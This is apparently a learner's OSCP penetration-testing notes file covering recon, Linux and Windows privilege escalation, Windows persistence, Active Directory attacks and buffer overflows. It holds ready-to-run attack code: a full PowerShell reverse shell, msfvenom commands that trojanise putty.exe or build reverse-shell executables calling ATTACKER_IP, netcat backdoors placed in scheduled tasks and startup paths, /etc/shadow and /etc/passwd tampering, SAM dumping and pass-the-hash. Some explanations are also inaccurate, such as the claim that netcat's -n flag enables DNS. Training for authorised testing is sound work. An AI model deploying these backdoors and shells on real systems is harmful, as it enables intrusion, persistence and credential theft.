# OSCP Notes

The course first focuses on basic linux commands and navigation using command line.
I'll just put some important ones on here and then we'll move onto the pentesting section of this course because that is honestly the only thing I am excited about.

- With `ps` command you can see the current processes
- With `kill` command you can kill a pariticular process.
- With `wget` command you can download a file from a remote web browser
- With `curl` command you can download manipulate http requests and modify them on the go

# Customizing the bash enviornment

_Alias_ is a string we can define which can replace the command name. By doing

```bash
alias lsa="ls -la"
```

We can define lsa as ls -la.

# Netcat

It can be run in two modes => client or server.

## Client Mode

we can connect to a tcp port by using client mode.

```bash
nc -n -v $(ip)
```

- -n tells the netcat to use the dns resolution
- -v tells the netcat to run in verbose mode

## Server Mode

```bash
nc -nvlp $(port)
```

This will open the listner.

```bash
nc -nv $(ip) $(port)
```

It can also be used to transfer files, open reverse shell and much more.

# PowerShell

It maintains an execution policy which describes which powershell scipts can be run and which cannot be.
By default it is restricted.
You can unrestrict is by using the following the command

```ps1
Set-ExecutionPolicy Unrestricted
```

And you can check it by the following command

```ps1
Get-ExecutionPolicy
```

## Transfer file using powershell

- ```ps1
  powershell -c "(new-object System.Net.WebClient).DownloadFile('$(source localtion)', '$(targetlocation)')"
  ```

````
* ```ps1
certutil -urlcache -f "$(source location)" $(filename)
````

# Powershell reverse Shell

```ps1
$client = New-Object System.Net.Sockets.TCPClient('$(ip)',$(port));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Passive Recon

## Google Dorking

[Dorksearch](https://dorksearch.com/) is used for google dorking and helps with the faster and more accurate resulets.

## Some Baic commands

- `whois` tells info about a domain
- `nslookup` does a reverse lookup on a domain
- `hosts` command will tell you about the different types of web servers and their ip addresses.

## Security Headers

[securityheaders.com](SecurityHeaders) website shows if the server admin or the developers of the companies are familiar with the concept of server hardening or not.

# Active Recon

## Dns Enumeration

Dns is just a database responsible for routing ip address to domain names.

- ```bash
  host $(website)
  ```

This commmand helps in finding the ip address of a domain and also helps in finding different types of webservers and their ips too.
you can specify the type of web server with the help of -t flag

## DNS Zone Transfers

This is an amazing technique which will basically tranfer the whole zone file of domain onto anyserver if misconfigured by sysadmins.
We can find out the domain servers by

```bash
host -t ns $(domain)
```

But The best tool for gathering info about domain is dnsenum

```bash
dnsenum $(domain)
```

There are several tools in Kali Linux that can automate DNS enumeration.

## Portscanning

Use nmap for portscanning.


Use Autorecon tool and Legion tool for faster enumeration. Don't waste time in basic scanning and try to eliminate as many rabit holes as possible.

# linux prives

# Automated linux privesc

First stabilize the shell and then run the following for linpeas

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```


# Manual


## readable /etc/shadow file

The /etc/shadow file contains user password hashes and is usually readable only by the root user.
Note that the /etc/shadow file on the VM is world-readable by user

```bash
ls -l /etc/shadow
```

View the contents of the /etc/shadow file:

```bash
cat /etc/shadow
```

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Switch to the root user, using the cracked password:

```bash
su root
```

## Some interesting files and commands


```bash
cat /etc/issue
cat /etc/os-release
ls -lah /etc/cron*
```

```bash
crontab -l
ps aux
find / -writable -type d 2>/dev/null # This command will find all the writable directories
find / -perm -u=s -type f 2>/dev/null # this will find all the suids and guids
```

## Checking the sudo capabilities

Run the following command to check which sudo capabilites does the current user have

```bash
sudo -l
```

Then just check the [gftobins](https://gtfobins.github.io/#) for that particualar command.

## suid and guid

Same like sudo capabilites just check the suid or guid which the current user have and see the [gftobins](https://gtfobins.github.io/#) for the prives for that command.

```bash
find / -perm -u=s -type f 2>/dev/null
``` 



## Exposed Credentials

Interesting Commands

```bash
cat .bashrc
env
```


## Inspecting Service Footprints

A daemon is a service process that runs in the background and supervises the system or provides functionality to other processes.
There are somtimes daemond or process which sysadmins setup for the device like ssh, database etc.

Make sure to inspect those because somtimes there are hidden things like password in the commands of those daemons.

Enumerate it using the following command.

```bash
watch -n 1 "ps -aux | grep pass"
```
```bash
sudo tcpdump -i lo -A | grep "pass"
```

sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'

sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit;exit

# Web application enumeration

There are two aspects server or the web application code (client)

We should always start with nmap that is sever enumeration with nmap.

## Directory Traversal

In this section we will explore Directory Traversal1 attacks, also known as path traversal attacks. This type of attack can be used to access sensitive files on a web server and typically occurs when a web application is not sanitizing user input.

## File Inclusion

We can use file inclusion vulnerabilities to execute local or remote files, while directory traversal only allows us to read the contents of a file. Since we can include files in the application's running code with file inclusion vulnerabilities, we can also display the file contents of non-executable files.

- Local File inclusion: It lets us execute any file which is stored locally on the target server and most of the cases we can do log poisoning by poisoning the file `/var/apache2/access.log`. We can change the user agent of the file and pass on the code we want to execute.

- Remote File inlucsion : It lets us execute any file on any server which is on the same network. So we can host a simple php webshell (or any language shell depends on the target) and make it execute that file on that server.



# Tunneling and port forwarding

There are 4 tools that are taught in the course:

• ssh
• sshutle
• plink 
• netsh

But these two tools are all we gonna need:

• ssh
• chisel

There are 4 type of port forwarding 

* Local port forwarding
* Dynamic port forwarding
* Remote Port forwarding
* Remote Dynamic Port forwarding

But with respect to the exam what we actually need is dynamic port forwarding. This can be done with chisel, both for linux and windows machines.


With the help of a very useful utility called socat we can manually port forward all the ports of the machines inside the dmz so that we can access these ports on our host machine.

Here is the explanation of the socate command:

-ddd option for verbositiy
fork option for creating a new process and sending all the data to the tcp:ip:port


Here On CONFLUENCE01, we'll start a verbose (-ddd) Socat process. 
It will listen on TCP port 2345 (TCP-LISTEN:2345), fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (TCP:10.4.50.215:5432).


```shell
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

Then we were able to connect to the psql database through port 2345 on the machine which we already had a reverse shell.


We found Atlassian hases which is options 12001 in hashcat. Easily decryptable.

```shell
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```


# linux privesc

## Writable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-writable:
`ls -l /etc/shadow
`
Generate a new password hash with a password of your choice:
`mkpasswd -m sha-512 newpasswordhere
`
Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
Switch to the root user, using the new password:
`su root
`

## Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable:

`ls -l /etc/passwd
`
Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere
`
Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`
Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password:

`su newroot
`

## sudo shell escapes

List the programs which sudo allows your user to run:

`sudo -l
`
Visit [GTFOBins](https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

## Cron

View the contents of the system-wide crontab:

`cat /etc/crontab
`
Note that the PATH variable starts with /home/user which is our user's home directory.

Create a file called overwrite.sh in your home directory with the following contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

```bash
chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```

## suid

Find all the SUID/SGID executables on the Debian VM:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.

Run the exploit script to gain a root shell:
/home/user/tools/suid/exim/cve-2016-1531.sh

# Windows privesc

## Situational awareness

Powershell Commands

- `whoami`
- `whoami /groups`
- `Get-LocalUser` - Get all the local users (Powershell command).
- `Get-Localgroupmember` : To get all the members from a particular group
- `systeminfo` : Get all the system info
- `ipconfig` : To get all the interfaces of the network.
- `netsta -ano` : To get all the connections that are running on the system.
- `Get-Process` : To see all the processes.
- `Get-History` : Obtain the list of all the commands.
- `(Get-PSReadlineOption).HistorySavePath` : This will list all the history recorded by the module psreadline (If Get-history doesn't work)
- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` : Get all the 32 bit installed applications 
- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` : Get all the 64-bit installed applications
- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` : Finding particular type of file through their extensions in a specific directory.


## Service Binary Hijacking

Each windows service has an assosiated binary file. When the service is started or in the running state this binary file is executed.

During the installation user most of the time does not configure the service and sometimes gives full read and write access to the file.

As a result, a lower-privileged user could replace the program with a malicious one. To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine

We can get the list of all the services through the following command:

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Once we find the service we wanna target we can use the following command for enumeration of persmission of that service.

```bash
icacls "service binary file path"
```

## Unattended Windows Installations

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Checking the powershell history

We can check the powershell history using:

```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```bash
cmdkey /list
```




# Windows persistence

## Abusing unprivelleged users

Making them part of administrators group is the best way because you can then directly RDP them or user WinRM to access that machine.

We can also download the sam and system bakup of files from registry

```powershell
reg save hklm\system system.bak
```

```powershell
reg save hklm\sam sam.bak
```

And pass it to secretdumps.py or samdump2 and get the hashes of the users. Once we have the hashes of the user we can pass it on to evil-winrm.

```bash
evil-winrm -i 10.10.142.152 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

## Backdooring the files
	
If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to C:\Program Files\PuTTY\putty.exe. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

There is an alternative way for establishing persistence by changing the properties of that executable itself.

We can create a powershell script named "backdoor.ps1" something like this

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

This will create a seperate process of netcat connecting back to the listner whenever exectued.

Then this will be put it into the target of the exectuable we are targeting by doing this.

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

Now whenever that executable will be double clicked or executed it will revert back top the listner.

## Hijacking File assosiations.

This is one of the most amazing ways to establing persistence because in this way rather than abusing only one executable
we can abuse all the executables with a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under HKLM\Software\Classes\. Let's say we want to check which program is used to open .txt files; we can just go and check for the .txt subkey and find which Programmatic ID (ProgID) is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:

## Windows task shedular

The most common way to schedule tasks is using the built-in Windows task scheduler. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use schtasks to interact with the task scheduler

```powershell
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

The previous command will create a "THM-TaskBackdoor" task and execute an nc64 reverse shell back to the attacker.
The /sc and /mo options indicate that the task should be run every single minute.
The /ru option indicates that the task will run with SYSTEM privileges.

## Through Startup login triggering

So there are some ways in which we can create the backdoor and put it in some places such that whenever the victim will restart its own device our backdoor will be triggered.

Now there are many places in which we can put our executable but first let's make on using msfvenom and transfer it onto the victim.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.71.43 LPORT=4450 -f exe -o revshell.exe
```

```bash
wget http://10.17.71.43:8000/revshell.exe
```

We then store the payload into the We then store the payload into the "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" folder to get a shell back for any user logging into the machine.
older to get a shell back for any user logging into the machine.

```bash
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

## Using registry starup

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

The registry entries under HKCU will only apply to the current user,and those under HKLM will apply to everyone.
Any program specified under the Run keys will run every time the user logs on.
Programs specified under the RunOnce keys will only be executed a single time.

Do the same thing with creating payload and all but this time you have to move the script to that registry instead of the program startup folder.

```bash
move revshell.exe C:\Windows
```

Let's then create a REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
The entry's name can be anything you like, and the value will be the command we want to execute.

## RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

Windows assigns each user a Relative ID (RID) and the default Administrator account always has a RID of 500. Regular users get RIDs of 1000 or greater.
By tampering with these RIDs in the registry, you can fool Windows into thinking an unprivileged user is actually an Administrator

We can find info about it through following command

```powershell
wmic useraccount get name,sid
```

and this is the output of my lab

```
Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010

```

The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator).
The SID is an identifier that allows the operating system to identify a user across a domain.
Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit.
The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it.

From Regedit, we will go to HKLM\SAM\SAM\Domains\Account\Users\ where there will be a key for each user in the machine.
Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2).

# Password Attacks

We can use tools like hydra to attack on a single port with brute forcing.

## ntlm hashes

mimikatz can be used for extracting plain text ntlm hashes from the SAM.

ntlm hashes can be cracked by using hashcat or john the ripper

There is also one more way to use the ntlm hahses which is passing them directly without cracking them.

We can use the following tools for passing the hashes

- smbclient
- CrackMapExec
- impacket
- psexec.py
- wmiexec.py




# Active Directory

To manage multiple computers at once we make one head computer which is called domain controller. It runs a software called Active directory to controll all the computers in a company.


These are some tips on active directory during pentesting:

* if you see 88 which is kerbers port and you can straight up tell that it is DOMAIN CONTROLLER.
* Start with smb enumeration because its quick.
* 5985 port is winrm. Think of it like ssh but in powershell, no need to focus in it either personally just used for authentication if you find the credentials.
* In AD finding usernames is just as good as finding passwords because they can be used for AS-REP roasting.
* There is not much to do until and unless you get some type of credentials in active directory.

Some allowed tools which we should use in oscp:
Bloodhound and sharphound
Evil-Winrm (for a stable shell)
Winpeas
Impacket(kerberos attacking mainly)
Crackmapexec(password spraying)
psexec (for pass the hash)
mimikatz
powersploit
ADpeas
chisel (for portforwarding)

## AD enumeration

`net user /domain` will check all the user in a domain.
`net user "{user}" /domain` will check info about that particular user.

Find out the user which belongs to *domain admins* group.

By using powerview you can easily automate this process to an extent:

`Get-NetComputer | select operatingsystem,dnshostname` finding out all the computers and services in the domain.
`Get-NetUser | select cn` all the users in the domain
`Find-LocaAdminAccess` will find out if the user you are running this command with has any admin access to any of the computer in the domain.


Automating of enumeration in AD can be done by bloodhound and sharphound.


## SMB

"Crackmapexec and impacket" should be the gotool for the windows exploitation. learn it fully.

```bash
crackmapexec smb (ip) -u "" -p ""
```

## AS-REP Roasting

This is related to how kerberos works, in active directory all the users are setup to require pre-authentication.

There are some accounts that does not require pre-authentication like service accounts.


## AD Exploitation






# Buffer Overflow

Buffers are temporary memory regions where data is stored.

Buffer Overlflow happens when more data is stored than the allocated memory for it.

Now when you provide that extra bytes in they have to go somewhere right? That will be our way in the buffer overflow.

Steps:

1. See if you can crash or overflow the program.
2. find out how many bytes it took to overflow the program (This is called EIP offset)
3. confirm the eip offset with eip overwrite.
4. create some shellcode to exploit the program.
5. Done!

EIP register holds the address of what is being executed (in this case the main function).

Heap is where you can allocate large chunks of memory, Heap and stack both moves opposite to each other.







